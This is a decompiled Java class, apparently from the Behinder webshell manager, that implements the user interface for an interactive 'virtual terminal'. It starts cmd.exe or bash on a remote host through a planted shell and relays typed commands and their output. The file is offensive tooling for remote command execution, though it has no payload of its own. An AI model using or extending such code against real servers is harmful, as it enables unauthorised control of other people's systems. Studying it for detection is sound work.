// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.ui.controller;

import javafx.event.ActionEvent;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.application.Platform;
import net.rebeyond.behinder.core.Constants;
import javafx.scene.control.Label;
import java.util.List;
import java.util.Map;
import org.json.JSONObject;
import net.rebeyond.behinder.core.ShellService;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;
import javafx.fxml.FXML;
import javafx.scene.control.TextArea;
import net.rebeyond.behinder.dao.ShellManager;

public class RealCmdViewController
{
    private ShellManager shellManager;
    @FXML
    private TextArea realCmdTextArea;
    @FXML
    private TextField shellPathText;
    @FXML
    private Button realCmdBtn;
    private ShellService currentShellService;
    private JSONObject shellEntity;
    Map<String, String> basicInfoMap;
    private List<Thread> workList;
    private Label statusLabel;
    private int running;
    private int currentPos;
    
    public void init(final ShellService shellService, final List<Thread> workList, final Label statusLabel, final Map<String, String> basicInfoMap) {
        this.currentShellService = shellService;
        this.shellEntity = shellService.getShellEntity();
        this.basicInfoMap = basicInfoMap;
        this.workList = workList;
        this.statusLabel = statusLabel;
        this.initRealCmdView();
    }
    
    private void initRealCmdView() {
        final String osInfo = this.basicInfoMap.get("osInfo");
        if (osInfo.indexOf("windows") >= 0 || osInfo.indexOf("winnt") >= 0) {
            this.shellPathText.setText("cmd.exe");
        }
        else {
            this.shellPathText.setText("/bin/bash");
        }
        this.realCmdBtn.setOnAction(event -> {
            if (this.realCmdBtn.getText().equals("\u542f\u52a8")) {
                this.createRealCmd();
            }
            else {
                this.stopRealCmd();
            }
        });
    }
    
    @FXML
    private void createRealCmd() {
        this.statusLabel.setText("\u6b63\u5728\u542f\u52a8\u865a\u62df\u7ec8\u7aef\u2026\u2026");
        final Runnable runner = () -> {
            try {
                String bashPath = this.shellPathText.getText();
                new Thread() {
                    @Override
                    public void run() {
                        try {
                            RealCmdViewController.this.currentShellService.createRealCMD(bashPath);
                        }
                        catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }.start();
                Thread.sleep(1000L);
                JSONObject resultObj = this.currentShellService.readRealCMD();
                while (resultObj.getString("status").equals("success") && resultObj.getString("msg").equals("")) {
                    resultObj = this.currentShellService.readRealCMD();
                    Thread.sleep(1000L);
                }
                String status = resultObj.getString("status");
                String msg = resultObj.getString("msg");
                Platform.runLater(() -> {
                    if (status.equals("success")) {
                        this.realCmdTextArea.appendText(msg);
                        this.statusLabel.setText("\u865a\u62df\u7ec8\u7aef\u542f\u52a8\u5b8c\u6210\u3002");
                        this.realCmdTextArea.requestFocus();
                        this.currentPos = this.realCmdTextArea.getLength();
                        this.realCmdBtn.setText("\u505c\u6b62");
                        this.running = Constants.REALCMD_RUNNING;
                    }
                    else {
                        this.statusLabel.setText("\u865a\u62df\u7ec8\u7aef\u542f\u52a8\u5931\u8d25:" + msg);
                    }
                });
            }
            catch (Exception e) {
                e.printStackTrace();
                Platform.runLater(() -> this.statusLabel.setText("\u865a\u62df\u7ec8\u7aef\u542f\u52a8\u5931\u8d25:" + e.getMessage()));
            }
            return;
        };
        final Thread workThrad = new Thread(runner);
        this.workList.add(workThrad);
        workThrad.start();
    }
    
    private void stopRealCmd() {
        this.statusLabel.setText("\u6b63\u5728\u505c\u6b62\u865a\u62df\u7ec8\u7aef\u2026\u2026");
        final Runnable runner = () -> {
            try {
                JSONObject resultObj = this.currentShellService.stopRealCMD();
                String status = resultObj.getString("status");
                String msg = resultObj.getString("msg");
                Platform.runLater(() -> {
                    if (status.equals("success")) {
                        this.statusLabel.setText("\u865a\u62df\u7ec8\u7aef\u5df2\u505c\u6b62\u3002");
                        this.realCmdBtn.setText("\u542f\u52a8");
                        this.running = Constants.REALCMD_STOPPED;
                    }
                    else {
                        this.statusLabel.setText("\u865a\u62df\u7ec8\u7aef\u542f\u52a8\u5931\u8d25:" + msg);
                    }
                });
            }
            catch (Exception e) {
                e.printStackTrace();
                Platform.runLater(() -> this.statusLabel.setText("\u64cd\u4f5c\u5931\u8d25:" + e.getMessage()));
            }
            return;
        };
        final Thread workThrad = new Thread(runner);
        this.workList.add(workThrad);
        workThrad.start();
    }
    
    @FXML
    private void onRealCMDKeyPressed(final KeyEvent keyEvent) {
        if (this.running != Constants.REALCMD_RUNNING) {
            this.statusLabel.setText("\u865a\u62df\u7ec8\u7aef\u5c1a\u672a\u542f\u52a8\uff0c\u8bf7\u5148\u542f\u52a8\u865a\u62df\u7ec8\u7aef\u3002");
            return;
        }
        if (this.realCmdTextArea.getCaretPosition() <= this.currentPos) {
            if (keyEvent.getCode() != KeyCode.ENTER) {
                keyEvent.consume();
                return;
            }
            this.realCmdTextArea.end();
        }
        if (keyEvent.getCode() != KeyCode.ENTER) {
            return;
        }
        final String cmd = this.realCmdTextArea.getText(this.currentPos, this.realCmdTextArea.getLength()).trim();
        this.statusLabel.setText("\u8bf7\u7a0d\u540e\u2026\u2026");
        final Runnable runner = () -> {

            JSONObject resultObj;
            String status;
            String result2;
            String msg;
            String string;
            String finalResult;
            String result3;
            try {
                String result = "";
                if (keyEvent.getCode() == KeyCode.ENTER) {
                    keyEvent.consume();
                    this.currentShellService.writeRealCMD(cmd + "\n");
                    Thread.sleep(1000L);
                    resultObj = this.currentShellService.readRealCMD();
                    status = resultObj.getString("status");
                    msg = (result2 = resultObj.getString("msg"));
                    if (result2.length() > 1) {
                        if (result2.startsWith(status, 0)) {
                            result2 = result2.substring(status.length());
                        }
                        if (result2.startsWith("\n")) {
                            string = result2;
                        }
                        else {
                            string = "\n" + result2;
                        }
                        result3 = (finalResult = string);
                        Platform.runLater(() -> {
                            this.realCmdTextArea.appendText(finalResult);
                            this.currentPos = this.realCmdTextArea.getLength();
                            return;
                        });
                        Thread.sleep(1000L);
                    }
                    Platform.runLater(() -> this.statusLabel.setText("\u5b8c\u6210\u3002"));
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            return;
        };
        final Thread workThrad = new Thread(runner);
        this.workList.add(workThrad);
        workThrad.start();
        keyEvent.consume();
    }
}
